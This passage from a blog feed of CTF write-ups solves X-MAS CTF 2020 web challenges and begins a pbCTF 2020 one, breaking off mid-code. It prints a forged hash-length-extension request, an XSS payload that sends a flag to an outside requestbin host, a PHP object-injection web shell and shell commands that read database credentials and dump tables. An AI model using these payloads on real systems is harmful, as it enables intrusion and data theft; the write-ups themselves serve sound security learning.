class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(reset(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The above code is the source code of helper.php. If you look at the hashFor function, you are using <code>salt</code>. As such, the hash value cannot be predicted, but you can bypass it using a <code>hash length extension attack</code>. </p><p>Kindly the length of the salt is <code>64</code>, as you can see it shows in the tin. If you don’t know the length of the salt, you need to estimate the length using <code>brute force</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And if you look at the getCatsNo function, you can see that the last value of the array is used as the number of cats by using the end function. </p><p>Therefore, when it becomes “<code>12 | 1 | Null Byte | 1000 |</code>“, <code>1000</code> is used as the number of cats. If there is no logic to fetch only the last value of the array, it won’t work.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/6.png?raw=true"><br>So, since I know the salt length, I made a payload using <code>hashpump</code>. (<code>URL encoding</code>)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fetch = <span class="built_in">require</span>(<span class="string">&quot;node-fetch&quot;</span>);</span><br><span class="line">fetch(<span class="string">&#x27;http://challs.xmas.htsp.ro:3003/api/buy.php&#x27;</span>, &#123;</span><br><span class="line">    method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body: <span class="string">&#x27;item_id=2&amp;state=12%20%7C%201%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%02%00%00%00%00%00%00%20%7C%201000&amp;hash=f48ccd5768b829f8856ae186eb4bf4a4&#x27;</span></span><br><span class="line">&#125;).then(<span class="function">(<span class="params">x</span>) =&gt;</span> x.text()).then(<span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.log(x));</span><br></pre></td></tr></table></figure><p>As above, I wrote the exploit code using JavaScript.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/7.png?raw=true"><br>Finally, return the exploit code to see the successful purchase of the flag.</p><blockquote><p>FLAG : X-MAS{1_h4v3_s0_m4ny_c4t5_th4t_my_h0m3_c4n_b3_c0ns1d3r3d_4_c4t_sh3lt3r_aaf30fcb4319effa}</p></blockquote><hr><h2 id="Web-Comfort-Bot-432-pts"><a href="#Web-Comfort-Bot-432-pts" class="headerlink" title=" (Web) Comfort Bot [432 pts]"></a><span style="color:#21C587"></span> (Web) Comfort Bot [432 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Comforn%20Bot/1.png?raw=true"><br>This time, we will solve one of the web problems from X-MAS CTF 2020 called Comfort Bot. </p><p>The peculiarity of the Comfort Bot problem was that it did not have a web server and was solved using the X-MAS bot within Discord. And it provides the source code, so let’s check the source code first.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bot.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> (message.content.startswith (<span class="string">&quot;!&quot;</span>)):</span><br><span class="line">spell = <span class="literal">True</span></span><br><span class="line">response = <span class="keyword">await</span> engine.getCleverResponse (authorID, message.content[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><p>The code above is the part that is executed when the value input from the X-MAS Discord Bot starts with an exclamation mark.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># engine.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, message</span>):</span></span><br><span class="line"><span class="keyword">if</span> (authorID == <span class="number">0</span>):</span><br><span class="line"><span class="keyword">return</span> random.choice([<span class="string">&quot;Oh, I quite certainly agree.&quot;</span>, <span class="string">&quot;There, there, it&#x27;s alright.&quot;</span>, <span class="string">&quot;Oh!&quot;</span>, <span class="string">&quot;Fascinating!&quot;</span>, <span class="string">&quot;Exquisite reply!&quot;</span>, <span class="string">&quot;Running program: COMFORT.&quot;</span>, <span class="string">&quot;Understandable.&quot;</span>, <span class="string">&quot;Hmm.&quot;</span>, <span class="string">&quot;I see.&quot;</span>, <span class="string">&quot;Well, if you really think that...&quot;</span>, <span class="string">&quot;What are you doing?&quot;</span>, <span class="string">&quot;What are you up to?&quot;</span>, <span class="string">&quot;What&#x27;s that?&quot;</span>, <span class="string">&quot;[Nodding]&quot;</span>, <span class="string">&quot;[Nodding and stroking chin saying mhmm]&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">await</span> parseUsers (cleverDriver.getCleverResponse (authorID, message))</span><br></pre></td></tr></table></figure><p>The code above is the getCleverResponse function in engile.py. In the code, you can see that if authorID is <code>0</code>, a random string in the array is printed, and if authorID is <code>not 0</code>, cleverDriver.getCleverResponse function is executed.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># driver.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, txt</span>):</span></span><br><span class="line"><span class="keyword">global</span> driver</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.open(&#x27;http://localhost/&#x27;,&#x27;_blank&#x27;);&quot;</span>)</span><br><span class="line">windows[authorID] = driver.window_handles[-<span class="number">1</span>]</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br><span class="line"><span class="keyword">while</span> (driver.execute_script (<span class="string">&quot;return cleverbot.aistate&quot;</span>) != <span class="number">0</span>):</span><br><span class="line"><span class="keyword">await</span> asyncio.sleep (<span class="number">0.4</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">reply = driver.execute_script (<span class="string">&quot;return cleverbot.reply&quot;</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.close()&quot;</span>)</span><br><span class="line">driver.switch_to_window(driver.window_handles[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> reply</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">CreateCleverDriver ()</span><br></pre></td></tr></table></figure><p>The code above is in the getCleverResmpose function in driver.py!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br></pre></td></tr></table></figure><p>If you look in the middle, you can see the code above. The <code>txt</code> value is put in the script variable without any verification, and the script is executed using the <code>execute_script</code> function. </p><p>You can trigger XSS in the logic right above.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script = &quot;cleverbot.sendAI(&#x27;!asdf&#x27;);fetch(&#x27;/flag&#x27;).then(x=&gt;x.text()).then(x=&gt;fetch(&quot;URL/?f=&quot; + x));(&#x27;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>If you manipulate the code and make it as above, the fetch function runs well and you can steal the flag.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!asdf&#39;);fetch(&#39;&#x2F;flag&#39;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&quot;https:&#x2F;&#x2F;384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net&#x2F;?f&#x3D; &quot; +x));(&#39;</span><br></pre></td></tr></table></figure><p>So I wrote the payload as above and sent it to the X-MAS Discord Bot.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Comforn%20Bot/2.png?raw=true"><br>Finally, when I checked the requestbin, I could see the flag came.</p><blockquote><p>FLAG : X-MAS{0h_J1nk135!!!Why_w0uld_y0u_br34k_our_commun4l_b07???125184ae}</p></blockquote><hr><h2 id="Web-How-Brutus-stole-492-pts"><a href="#Web-How-Brutus-stole-492-pts" class="headerlink" title=" (Web) How Brutus stole [492 pts]"></a><span style="color:#21C587"></span> (Web) How Brutus stole [492 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/How%20Brutus%20stol/1.png?raw=true"><br>This time, we will solve the problem of How Brutus stole Christmas among the web problems raised by the X-MAS CTF. This problem is a problem that I tried until the last time because I didn’t have enough time to solve it. </p><p>The peculiar thing about this problem is that one CTF site is given as a problem, and the problem is that the CTF site is hacked using the problem in the given CTF site.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pageContent</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$file_name</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$newContent</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name=<span class="string">&quot;data/content.txt&quot;</span>; </span><br><span class="line">    <span class="variable">$file</span> = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$file</span>;</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;newContent;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setContent</span>(<span class="params"><span class="variable">$newContent</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$newContent</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">    fclose(<span class="variable">$fd</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setFooter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;newFooter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$newFooter</span>=unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&quot;newFooter&quot;</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;&#x27;</span>.<span class="variable">$newFooter</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;PWNgyan 2020!&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span> = <span class="keyword">new</span> pageContent;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$page</span>;</span><br><span class="line">setFooter();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>I’m going to hack the site using problem 1 on the CTF site. If you come into question 1, you can find the code above.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">  fclose(<span class="variable">$fd</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Looking at the code, you can see that when the destructor runs, it creates a file. After seeing this, I thought I should upload a web shell using PHP Object Injection.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:9:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:10:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, I just wrote a simple payload and sent it as above, but the file was not created well. So, mentality went out and did this and that, and suddenly <code>as3617</code> released PHP Object Injection PPT.</p><p>Looking at this PPT, I learned that when a variable is defined as Private, Null Byte is attached to both sides of the variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:11:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:12:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, based on this, I wrote the payload again as above, but it didn’t work well. So I couldn’t solve the problem because of this. </p><p>So, after the contest, I asked a person belonging to Defenit who was all over the web. It turns out that if the variable is defined as private, you need to reference the variable like \x00classname\x00variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:22:&quot;�pageContent�file_name&quot;;s:15:&quot;data&#x2F;pyburp.php&quot;;s:23:&quot;�pageContent�newContent&quot;;s:15:&quot;&lt;?&#x3D;&#96;$_GET[x]&#96;?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, finally, I wrote the payload as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/How%20Brutus%20stol/2.png?raw=true"><br>When I uploaded the webshell and accessed the file, I was able to confirm that the webshell was uploaded well.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;</span><br><span class="line">output &#x3D;&gt; ctfx</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx</span><br><span class="line">output &#x3D;&gt; composer.json composer.lock htdocs include install writable</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include</span><br><span class="line">output &#x3D;&gt; Config.php cache.inc.php captcha.inc.php config config_loader.inc.php constants.inc.php db.inc.php email.inc.php files.inc.php general.inc.php json.inc.php language layout mellivora.inc.php raceconditions.inc.php session.inc.php thirdparty two_factor_auth.inc.php xsrf.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include&#x2F;config</span><br><span class="line">&#x3D;&gt; config.default.inc.php db.default.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;cat ~&#x2F;ctfx&#x2F;include&#x2F;config&#x2F;db.default.inc.php</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * This file contains default configuration.</span><br><span class="line"> *</span><br><span class="line"> *        DO NOT MAKE CHANGES HERE</span><br><span class="line"> *</span><br><span class="line"> * Copy this file and name it &quot;db.inc.php&quot;</span><br><span class="line"> * before making any changes. Any changes in</span><br><span class="line"> * db.inc.php will override the default</span><br><span class="line"> * config. It is also possible to override</span><br><span class="line"> * configuration options using environment</span><br><span class="line"> * variables. Environment variables override</span><br><span class="line"> * both the default settings and the hard-coded</span><br><span class="line"> * user defined settings.</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_ENGINE&#39;, &#39;mysql&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_HOST&#39;, &#39;localhost&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PORT&#39;, 3306);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_NAME&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_USER&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PASSWORD&#39;, &#39;rac9138cn98ascnascud&#39;);</span><br></pre></td></tr></table></figure><p>When I checked using a web shell, I could see that the Database configuration file exists. Then, let’s connect to the DB using the mysql command.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/How%20Brutus%20stol/3.png?raw=true"><br>[+] If you know the database name, user name, and password, you can run the query as above using the -e option of the mysql command and see the result immediately.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;show tables;&quot;</span><br><span class="line">output &#x3D;&gt; Tables_in_mellivora categories challenges cookie_tokens countries exceptions files hints ip_log news reset_password submissions two_factor_auth user_types users</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;select * from challenges&quot;</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">idaddedadded_bytitlecategorydescriptionexposedavailable_fromavailable_untilflagcase_insensitiveautomarkpointsinitial_pointsminimum_pointssolve_decaysolvesnum_attempts_allowedmin_seconds_between_submissionsrelies_on</span><br><span class="line">116060783851Brutus1Everyone hates Brutus! But does Brutus hate everyone? Who knows? Or rather, who cares?! What we care about here is the flag. Nothing more.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050[&#x2F;url]115846992001617235206pwngyanctf&#123;we_dont_remember_the_actual_flag_:(&#125;01500500501002050</span><br><span class="line">216060810561Hard Challenge1Now it&#39;s time for a ramp-up in difficulty. You thought Brutus was hard? Ha! Check this one out then, punk.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3051[&#x2F;url]115846992001617235206X-MAS&#123;Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0&#125;01500500501000050</span><br><span class="line">316060811361Hello World!2Welcome to PWNgyan CTF 2020!</span><br><span class="line">\n</span><br><span class="line">\n[b]pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;[&#x2F;b]115846992001617235206pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;0110101013050</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>When I ran through the database using the mysql command, there was a flag of the table called challenges.</p><blockquote><p>FLAG : X-MAS{Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blind Command Injection </tag>
            
            <tag> Hash Length Extension Attack </tag>
            
            <tag> XSS </tag>
            
            <tag> PHP Object Injection </tag>
            
            <tag> Type juggling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pbCTF 2020 Write Up</title>
      <link href="2020/12/07/2020-12-07-pb-CTF/"/>
      <url>2020/12/07/2020-12-07-pb-CTF/</url>
      
        <content type="html"><![CDATA[<p>I participated by opening the CTF this time at Perfect Blue. Let’s write Write Up only for web challenges solved by CTF.</p><hr><h2 id="Web-Sploosh-156-pts"><a href="#Web-Sploosh-156-pts" class="headerlink" title=" (Web) Sploosh [156 pts]"></a><span style="color:#21C587"></span> (Web) Sploosh [156 pts]</h2><p>This time, we will solve a problem called Sploosh among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Sploosh/1.png?raw=true"><br>When you come into challenge, you can see that there is a form for entering the URL, and you can download the source code by clicking here.<br><br></p><p>Once you think about it before looking at the source code, you might be suspicious of <code>SSRF</code> because it has the ability to type in the url.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$url</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$json</span> = file_get_contents(<span class="string">&quot;http://splash:8050/render.json?timeout=1&amp;url=&quot;</span> . urlencode(<span class="variable">$url</span>));</span><br><span class="line">  <span class="variable">$out</span> = <span class="keyword">array</span>(<span class="string">&quot;geometry&quot;</span> =&gt; json_decode(<span class="variable">$json</span>)-&gt;geometry);</span><br><span class="line">  <span class="keyword">echo</span> (<span class="variable">$out</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s check the api.php source code. You can see that the url is input and the file is opened and checked with the file_get_contents() function. And you can see that the file value is output as the geometry value.<br><br><br><br>SSRF seems to be fired by the <code>file_get_contents()</code> function of api.php.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$remote_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span 